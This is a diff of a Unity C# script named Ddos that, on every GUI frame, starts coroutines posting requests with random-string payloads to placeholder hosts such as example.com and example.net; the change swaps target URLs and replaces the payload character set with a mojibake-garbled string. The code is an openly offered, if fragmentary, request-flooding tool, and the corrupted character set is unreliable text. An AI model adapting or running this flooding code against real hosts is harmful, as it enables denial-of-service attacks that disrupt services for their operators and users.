@@ -11,10 +11,9 @@ public class Ddos : MonoBehaviour
     void OnGUI()
     {
         StartCoroutine(postRequest("https://www.example.com"));
-        StartCoroutine(postRequest("https://www.example2.com"));
-        StartCoroutine(postRequest("https://www.example3.com"));
+        StartCoroutine(postRequest("https://www.example.net"));
+        StartCoroutine(postRequest("https://www.example.org"));
     }
-
 
     IEnumerator postRequest(string url)
     {
@@ -38,7 +37,7 @@ public class Ddos : MonoBehaviour
 
     string RandomStringGenerator(int length)
     {
-        string characters = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO0050PQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏĞÑÒÓÔÕÖ×ØÙÚÛÜİŞßàáâãäåæçèéêëìíîï00F0ğñòóôõö÷øùúûüışÿ";
+        string characters = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO0050PQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~Â¡Â¢Â£Â¤Â¥Â¦Â§Â¨Â©ÂªÂ«Â¬Â­Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€ÃÃ‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹ÃŒÃÃÃÃÃ‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃÃÃŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯00F0Ã°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿";
         string generated_string = "";
 
         for (int i = 0; i < length; i++)
